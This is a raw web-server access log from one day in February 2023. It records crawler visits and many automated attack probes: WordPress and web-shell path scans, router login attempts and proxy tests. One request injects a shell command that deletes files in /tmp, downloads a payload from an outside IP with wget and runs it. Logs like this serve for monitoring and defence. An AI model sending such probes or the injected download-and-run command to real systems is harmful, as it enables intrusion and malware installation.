40.77.167.165 - - [11/Feb/2023:11:52:35 +0000] "GET /download/mmZo4mvulOc HTTP/1.1" 404 6616 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [11/Feb/2023:11:59:05 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
66.249.73.232 - - [11/Feb/2023:12:05:13 +0000] "GET /download/leVVTADZIxM HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
138.68.80.252 - - [11/Feb/2023:12:06:48 +0000] "GET http://test.getproxylist.com/ HTTP/1.1" 200 18589 "foobartest.com" "FooBarTest"
138.68.80.252 - - [11/Feb/2023:12:06:49 +0000] "\x04\x01\x00P\x00\x00\x00\x01\x00test.getproxylist.com\x00" 400 157 "-" "-"
138.68.80.252 - - [11/Feb/2023:12:06:49 +0000] "\x05\x02\x00\x01" 400 157 "-" "-"
138.68.80.252 - - [11/Feb/2023:12:06:49 +0000] "\x05\x02\x00\x01" 400 157 "-" "-"
138.68.80.252 - - [11/Feb/2023:12:06:49 +0000] "\x04\x01\x00PXc\xC3\x06\x00" 400 157 "-" "-"
154.89.5.101 - - [11/Feb/2023:12:13:42 +0000] "GET / HTTP/1.1" 200 18574 "-" "-"
66.249.73.232 - - [11/Feb/2023:12:20:13 +0000] "GET /download/Sz8F9QyeJGM HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
3.230.194.44 - - [11/Feb/2023:12:27:25 +0000] "GET /rss HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
66.249.73.230 - - [11/Feb/2023:12:35:13 +0000] "GET /download/Sz8F9QyeJGM HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:12:50:16 +0000] "GET /download/leVVTADZIxM HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
193.32.162.159 - - [11/Feb/2023:12:53:35 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
177.84.40.13 - - [11/Feb/2023:12:57:11 +0000] "GET / HTTP/1.1" 200 18574 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
66.249.73.234 - - [11/Feb/2023:12:57:15 +0000] "GET /download/hwf_DfZptdE HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
172.104.11.4 - - [11/Feb/2023:13:05:32 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03H\x8F\xB1\xE4\xA4]#\xCC\xEF\xDC\xCE\xA243J\x1DK\xDE\x12\x89\x91?\xA4\x03\x83\xF9A\xDD\xDA^\x01\xCB\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
80.76.51.29 - - [11/Feb/2023:13:12:52 +0000] "GET /wp-admin/shell20211028.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
143.110.222.166 - - [11/Feb/2023:13:13:54 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
51.142.189.28 - - [11/Feb/2023:13:20:25 +0000] "GET / HTTP/1.1" 200 18574 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
51.142.189.28 - - [11/Feb/2023:13:20:25 +0000] "GET /wp-includes/ID3/license.txt HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
51.142.189.28 - - [11/Feb/2023:13:20:25 +0000] "GET /feed/ HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
51.142.189.28 - - [11/Feb/2023:13:20:25 +0000] "GET /xmlrpc.php?rsd HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
51.142.189.28 - - [11/Feb/2023:13:20:25 +0000] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
51.142.189.28 - - [11/Feb/2023:13:20:25 +0000] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
51.142.189.28 - - [11/Feb/2023:13:20:26 +0000] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
51.142.189.28 - - [11/Feb/2023:13:20:26 +0000] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
51.142.189.28 - - [11/Feb/2023:13:20:26 +0000] "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
51.142.189.28 - - [11/Feb/2023:13:20:26 +0000] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
51.142.189.28 - - [11/Feb/2023:13:20:27 +0000] "GET /2021/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
51.142.189.28 - - [11/Feb/2023:13:20:27 +0000] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
51.142.189.28 - - [11/Feb/2023:13:20:27 +0000] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
51.142.189.28 - - [11/Feb/2023:13:20:27 +0000] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
51.142.189.28 - - [11/Feb/2023:13:20:27 +0000] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
51.142.189.28 - - [11/Feb/2023:13:20:28 +0000] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
51.142.189.28 - - [11/Feb/2023:13:20:28 +0000] "" 400 0 "-" "-"
66.249.73.234 - - [11/Feb/2023:13:21:05 +0000] "GET /download/Uadi6gpsysc HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
52.167.144.88 - - [11/Feb/2023:13:31:50 +0000] "GET /sitemap.xml HTTP/1.1" 404 6622 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [11/Feb/2023:13:59:41 +0000] "GET / HTTP/1.1" 200 18574 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
104.194.196.63 - - [11/Feb/2023:14:02:42 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
104.194.196.63 - - [11/Feb/2023:14:02:43 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
34.222.123.149 - - [11/Feb/2023:14:02:46 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0"
34.222.123.149 - - [11/Feb/2023:14:02:47 +0000] "GET /favicon.ico HTTP/1.1" 200 0 "http://blog.techhub.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0"
34.222.123.149 - - [11/Feb/2023:14:02:52 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0"
34.222.123.149 - - [11/Feb/2023:14:02:52 +0000] "GET /favicon.ico HTTP/1.1" 200 0 "http://blog.techhub.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0"
66.249.73.230 - - [11/Feb/2023:14:04:45 +0000] "GET /download/nbNHdNj1jzQ HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
37.120.217.243 - - [11/Feb/2023:14:15:19 +0000] "GET /xmlrpc.php HTTP/1.1" 404 555 "aveta-womencare.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36"
66.249.73.232 - - [11/Feb/2023:14:20:13 +0000] "GET /download/tGg9ZkSYDxs HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:14:22:16 +0000] "GET /ads.txt HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:14:27:15 +0000] "GET /download/lORwBG1BtRY HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
68.69.184.202 - - [11/Feb/2023:14:46:17 +0000] "GET /robots.txt HTTP/1.1" 200 24 "-" "test"
68.69.184.202 - - [11/Feb/2023:14:46:19 +0000] "GET / HTTP/1.1" 200 18574 "-" "test"
68.69.184.202 - - [11/Feb/2023:14:46:20 +0000] "GET /favicon.ico HTTP/1.1" 200 0 "-" "test"
193.32.162.159 - - [11/Feb/2023:14:51:34 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.79.181.104 - - [11/Feb/2023:14:52:43 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03z\x9F\x01\xE6e\x1ECS\xA6\x11\x09\x87J3f\xEE3\xA1B\xA3\xAC\x15@\x93\x17Z\x1F\x17\xF4\x9E\x90Y\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
159.192.99.97 - - [11/Feb/2023:14:55:17 +0000] "GET / HTTP/1.1" 200 18574 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
143.110.222.166 - - [11/Feb/2023:15:02:05 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.246.220.98 - - [11/Feb/2023:15:10:51 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 6616 "http://46.101.11.163:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.246.220.98 - - [11/Feb/2023:15:10:51 +0000] "" 400 0 "-" "-"
207.46.13.3 - - [11/Feb/2023:15:20:09 +0000] "GET /in/maher-zain-songs-lyrics-for-the-rest-of-my-life/mamaktuwa HTTP/1.1" 404 6622 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
54.245.13.219 - - [11/Feb/2023:15:24:46 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
54.184.131.34 - - [11/Feb/2023:15:24:48 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3440.106 Safari/537.36"
207.46.13.3 - - [11/Feb/2023:15:25:46 +0000] "GET /in/dunsin-oyekan-songs-2020/mamaktuwa HTTP/1.1" 404 6622 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
35.89.89.39 - - [11/Feb/2023:15:27:08 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
18.236.126.114 - - [11/Feb/2023:15:28:38 +0000] "GET /favicon.ico HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
107.149.206.100 - - [11/Feb/2023:15:36:46 +0000] "HEAD /plus/mytag_js.php HTTP/1.1" 404 0 "-" "-"
107.149.206.100 - - [11/Feb/2023:15:36:46 +0000] "HEAD /download.php HTTP/1.1" 404 0 "-" "-"
107.149.206.100 - - [11/Feb/2023:15:36:46 +0000] "HEAD /carbuyaction.php HTTP/1.1" 404 0 "-" "-"
107.149.206.100 - - [11/Feb/2023:15:36:46 +0000] "HEAD /data/admin/ver.txt HTTP/1.1" 404 0 "-" "-"
66.249.73.234 - - [11/Feb/2023:15:50:13 +0000] "GET /download/tGg9ZkSYDxs HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:15:57:15 +0000] "GET /download/BCHc5qdSpsE HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
173.212.237.3 - - [11/Feb/2023:15:57:22 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozilla/5.0 (compatible; GetHPinfo.com-Bot/0.1; +http://www.gethpinfo.com/bot/"
143.110.222.166 - - [11/Feb/2023:16:06:16 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
114.119.149.71 - - [11/Feb/2023:16:08:02 +0000] "GET /in/ras-muhamad-salam-mp3/assets/download-lagu-gratis.jpg HTTP/1.1" 404 6622 "http://visitors.techhub.com/in/ras-muhamad-salam-mp3/mamaktuwa" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.151.146 - - [11/Feb/2023:16:13:46 +0000] "GET /in/mp3-house-takbiran/assets/download-lagu-gratis.jpg HTTP/1.1" 404 6616 "http://visitors.techhub.com/in/mp3-house-takbiran/mamaktuwa" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.154.5 - - [11/Feb/2023:16:19:46 +0000] "GET /in/campursari-banyumasan-mp3-download/assets/download-lagu-gratis.jpg HTTP/1.1" 404 6616 "http://visitors.techhub.com/in/campursari-banyumasan-mp3-download/mamaktuwa" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
40.77.167.165 - - [11/Feb/2023:16:23:40 +0000] "GET /download/ND05w01oQ-8 HTTP/1.1" 404 6616 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
114.119.137.80 - - [11/Feb/2023:16:25:58 +0000] "GET /download/qbMT8EV_mFo HTTP/1.1" 404 6616 "http://blog.techhub.com/in/ma-umathu-kala-song-download-mp3/mamaktuwa" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
193.239.204.90 - - [11/Feb/2023:16:32:24 +0000] "GET /wp-login.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
78.27.130.20 - - [11/Feb/2023:16:34:35 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
78.27.130.20 - - [11/Feb/2023:16:34:36 +0000] "GET /HNAP1/ HTTP/1.1" 404 6622 "http://46.101.11.163/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
20.25.176.80 - - [11/Feb/2023:16:39:29 +0000] "POST /wp-plain.php HTTP/1.1" 404 555 "www.google.com" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.176.80 - - [11/Feb/2023:16:39:29 +0000] "GET /wp-content/plugins/dzs-zoomsounds/savepng.php?location=1877.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
20.25.176.80 - - [11/Feb/2023:16:39:30 +0000] "GET /nqjsehju.php?Fox=d3wL7 HTTP/1.1" 404 555 "www.google.com" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.176.80 - - [11/Feb/2023:16:39:30 +0000] "POST /ALFA_DATA/alfacgiapi/perl.alfa HTTP/1.1" 404 6622 "www.google.com" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.176.80 - - [11/Feb/2023:16:39:30 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.176.80 - - [11/Feb/2023:16:39:30 +0000] "POST /alfacgiapi/perl.alfa HTTP/1.1" 404 6616 "www.google.com" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
66.249.73.230 - - [11/Feb/2023:16:42:15 +0000] "GET /download/2idiDZO49QA HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
45.79.181.251 - - [11/Feb/2023:16:49:46 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03" 400 157 "-" "-"
209.141.33.215 - - [11/Feb/2023:16:50:07 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+205.185.121.139/jaws;sh+/tmp/jaws HTTP/1.1" 499 0 "-" "Hello, world"
65.108.110.26 - - [11/Feb/2023:16:55:09 +0000] "GET /robots.txt HTTP/1.1" 200 24 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
65.108.110.26 - - [11/Feb/2023:16:55:10 +0000] "GET /feed/GebMoTIS_pg/ateez+%EC%97%90%EC%9D%B4%ED%8B%B0%EC%A6%88+answer+color+coded+lyrics+eng+rom+han+%EA%B0%80%EC%82%AC HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
65.108.110.26 - - [11/Feb/2023:16:55:12 +0000] "GET /feed/I9QHKxBjnLA/ateez+%EC%97%90%EC%9D%B4%ED%8B%B0%EC%A6%88+inception+mv HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
65.108.110.26 - - [11/Feb/2023:16:55:14 +0000] "GET /feed/JaAGRegSISY/%E0%A4%AC+%E0%A4%AC+%E0%A4%95+%E0%A4%B2%E0%A4%97+%E0%A4%9A+%E0%A4%9F+the+boo+boo+song+hindi+rhymes+for+children+chuchu+tv HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
65.108.110.26 - - [11/Feb/2023:16:55:16 +0000] "GET /feed/K7LY9Ta0eiY/ateez+%EC%97%90%EC%9D%B4%ED%8B%B0%EC%A6%88+thanxx+official+mv HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
65.108.110.26 - - [11/Feb/2023:16:55:17 +0000] "GET /feed/Kl-ZtjHAyQQ/kosida+alufu+%D8%A3%D9%84%D9%88+%D9%81+%D8%A7%D9%84%D8%AE+%D9%84+%D9%82+%D9%85+%D8%A3%D9%84+%D9%88%D9%81+sheikh+ibrahim+niass HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
65.108.110.26 - - [11/Feb/2023:16:55:19 +0000] "GET /feed/N2dsnGc7TFk/raiden+x+%EC%B0%AC%EC%97%B4+chanyeol+yours+feat+%EC%9D%B4%ED%95%98%EC%9D%B4+%EC%B0%BD%EB%AA%A8+mv HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
65.108.110.26 - - [11/Feb/2023:16:55:21 +0000] "GET /feed/N5qWjQ9j6l0/wayv+%E5%A8%81%E7%A5%9Ev+love+talk+mv HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
66.249.73.230 - - [11/Feb/2023:16:55:22 +0000] "GET /download/QvqI6yh_myQ HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
65.108.110.26 - - [11/Feb/2023:16:55:22 +0000] "GET /feed/aYBGEUG6UKU/pashto+whatsapp+states+poetry+%D8%A2%D8%B1%D9%85%D8%A7%D9%86+%D8%B3%D8%B1%D8%A7%D8%AC+pashto+states+sad+states+video HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
65.108.110.26 - - [11/Feb/2023:16:55:24 +0000] "GET /feed/ab4-uWVYW1E/top+50+most+viewed+arabic+songs+on+youtube+of+all+time+%D8%A7%D9%84%D8%A7%D8%BA%D8%A7%D9%86%D9%8A+%D8%A7%D9%84%D8%B9%D8%B1%D8%A8%D9%8A%D8%A9+%D8%A7%D9%84%D8%A3%D9%83%D8%AB%D8%B1+%D9%85%D8%B4%D8%A7%D9%87%D8%AF%D8%A9 HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
65.108.110.26 - - [11/Feb/2023:16:55:26 +0000] "GET /feed/dTT3MRODUsA/ateez+%EC%97%90%EC%9D%B4%ED%8B%B0%EC%A6%88+answer+official+mv HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
65.108.110.26 - - [11/Feb/2023:16:55:28 +0000] "GET /feed/eK3i-gTq0uA/era+ameno+sina+postac%C4%B1+atilla+khan+remix+car+video+limma HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
65.108.110.26 - - [11/Feb/2023:16:55:29 +0000] "GET /feed/eLfpeg3Fofo/ateez+%EC%97%90%EC%9D%B4%ED%8B%B0%EC%A6%88+wonderland+mv HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
65.108.110.26 - - [11/Feb/2023:16:55:31 +0000] "GET /feed/gj-VU9oK2Yo/nct+127+%EC%97%94%EC%8B%9C%ED%8B%B0+127+regular+english+ver+mv HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
65.108.110.26 - - [11/Feb/2023:16:55:33 +0000] "GET /feed/xKMSa94KHN8/ateez+the+real+%EB%A9%8B+lyrics+color+coded+han+rom+eng HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
65.108.110.26 - - [11/Feb/2023:16:55:34 +0000] "GET /feed/xtcVwuauVV0/ateez+%EC%97%90%EC%9D%B4%ED%8B%B0%EC%A6%88+%EB%B6%88%EB%86%80%EC%9D%B4%EC%95%BC+i+m+the+one+official+mv HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
